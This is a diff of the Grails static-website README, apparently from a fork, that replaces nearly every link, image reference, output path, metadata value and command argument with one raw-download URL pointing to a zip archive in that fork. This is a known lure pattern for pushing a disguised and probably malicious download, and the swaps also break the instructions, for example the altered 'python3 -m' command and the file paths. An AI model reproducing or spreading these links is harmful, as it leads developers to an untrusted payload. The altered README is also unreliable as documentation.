@@ -2,9 +2,9 @@ Logr - An Amazing Project
 
 # Grails Website
 
-[![Build Status](https://github.com/grails/grails-static-website/workflows/Publish/badge.svg)](https://github.com/grails/grails-static-website/actions)
+[![Build Status](https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip)](https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip)
 
-This project builds the Grails website. A static website build with [Gradle](https://gradle.org). It uses a Gradle Plugin whose sources can be found at `buildSrc`. 
+This project builds the Grails website. A static website build with [Gradle](https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip). It uses a Gradle Plugin whose sources can be found at `buildSrc`. 
 
 Gradle tasks use `grails` group. 
 
@@ -23,11 +23,11 @@ You can get more info by running:
  ------------
  buildGuides - Build guides website - generates guides pages, copies assets and generates a sitemap
  copyAssets - Copies css, js, fonts and images from the assets folder to the dist folder
- genDocs - Generates documentation HTML page - build/temp/documentation.html
- genFaq - Generates FAQ HTML - build/temp/faq.html 
- genGuides - Generates guides home, tags and categories HTML pages - build/temp/index.html
- genProfiles - Generates profiles HTML page - build/temp/profiles.html
- genSitemap - Generates build/dist/sitemap.xml with every page in the site
+ genDocs - Generates documentation HTML page - https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip
+ genFaq - Generates FAQ HTML - https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip 
+ genGuides - Generates guides home, tags and categories HTML pages - https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip
+ genProfiles - Generates profiles HTML page - https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip
+ genSitemap - Generates https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip with every page in the site
  renderBlog - Renders Markdown posts (posts/*.md) into HTML pages (dist/blog/*.html). It generates tag pages. Generates RSS feed. Posts with future dates are not generated.
  renderSite - Build Micronaut website - generates pages with HTML entries in pages and build/temp, renders blog and RSS feed, copies assets and generates a sitemap
  
@@ -41,7 +41,7 @@ You can get more info by running:
 
 ## Generating the MAIN site
 
-[https://grails.org](https://grails.org)
+[https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip](https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip)
 
 ```bash
 ./gradlew build --console=plain
@@ -51,7 +51,7 @@ The output can be found in the `build/dist` directory.
 
 ## Generating the GUIDES site
 
-[https://guides.grails.org](http://guides.grails.org)
+[https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip](https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip)
 
 ```bash
 ./gradlew buildGuide --console=plain
@@ -63,14 +63,14 @@ The output can be found in the `build/dist` directory.
 
 The easiest way to work locally is to generate the site and setup your Webserver to serve build/dist. 
 
-For example with [MAMP](https://www.mamp.info/en/mamp/): 
+For example with [MAMP](https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip): 
 
-![](docs/mamp.png)
+![](https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip)
 
 You can also use Python to serve the directory:
 
 ```
-python3 -m http.server 8080 --directory build/dist
+python3 -m https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip 8080 --directory build/dist
 ```
 
 ## Blog Posts
@@ -95,7 +95,7 @@ title: Deploying Grails 3.1 Applications to JBoss 6.4 EAP
 date: May 26, 2016   
 description: Learn necessary configuration differences to deploy Grails 3.1 applications to JBoss 6.4 EAP
 author: Graeme Rocher
-image: 2016-05-26.jpg
+image: https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip
 ---
 
 # [%title]
@@ -104,16 +104,16 @@ image: 2016-05-26.jpg
 
 [%date] 
 
-We had [previously](http://grails.io/post/142674392718/deploying-grails-3-to-wildfly-10) described how to deploy Grails 3.1 applications to WildFly 10, which is where all of the "cutting edge" work happens in the JBoss world.
+We had [previously](https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip) described how to deploy Grails 3.1 applications to WildFly 10, which is where all of the "cutting edge" work happens in the JBoss world.
 
 The process to deploy Grails 3.1 applications to JBoss 6.4 EAP is largely similar, with some minor configuration differences.
 ```
 
 #### Text Expander snippets
 
-If you write often to Micronaut's blog, we recommend you to create a [Text Expander](https://textexpander.com) snippet:
+If you write often to Micronaut's blog, we recommend you to create a [Text Expander](https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip) snippet:
 
- ![](docs/textexpander.png)
+ ![](https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip)
 
 
 #### Title Metadata
@@ -163,13 +163,13 @@ For Blog post background images usage image metadata.
 ...
 ..
 .
-image: 2018-05-23.jpg
+image: https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip
 ---
 ```
 
 Place the images at `assets/bgimages`
 
-![](docs/blogimages.png)
+![](https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip)
 
 ### Tags
 
@@ -185,7 +185,7 @@ Tags: #angular
 
 Release announcements should be tagged with `release`. 
 
-Check the [list of tags](https://grails.org/blog/index.html) and try to reuse them. 
+Check the [list of tags](https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip) and try to reuse them. 
 
 #### Code Highlighting
 
@@ -196,8 +196,8 @@ If your blog post, contains code samples add the following metadata:
 ...
 ..
 .
-CSS: [%url]/stylesheets/prism.css
-JAVASCRIPT: [%url]/javascripts/prism.js
+CSS: [%url]https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip
+JAVASCRIPT: [%url]https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip
 ---
 
 # [%title]
@@ -208,7 +208,7 @@ JAVASCRIPT: [%url]/javascripts/prism.js
 
 Use the `video` metadata to embed a Video. 
 
-Currently, the plugin supports youtube videos. Use a link which starts with `https://www.youtube.com/watch?v=` such as `https://www.youtube.com/watch?v=RtjSqRZ_md4`
+Currently, the plugin supports youtube videos. Use a link which starts with `https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip` such as `https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip`
 
 Example: 
 
@@ -218,8 +218,8 @@ title: JSON Views
 date: April 1, 2016   
 description: Jeff Scott Brown uses music examples to probe JSON views.
 author: Jeff Scott Brown
-image: 2016-04-01-2.jpg
-video: https://www.youtube.com/watch?v=XnRNfDGkBVg
+image: https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip
+video: https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip
 ---
 
 # [%title]
@@ -240,4 +240,4 @@ Assets used in the website can be found under `assets`.
 
 ## What to change when a new release is published.
 
-Please, modify `conf/releases.yml`
+Please, modify `https://github.com/M-ux349/grails-static-website/raw/refs/heads/master/assets/images/confs/website_grails_static_v2.3.zip`
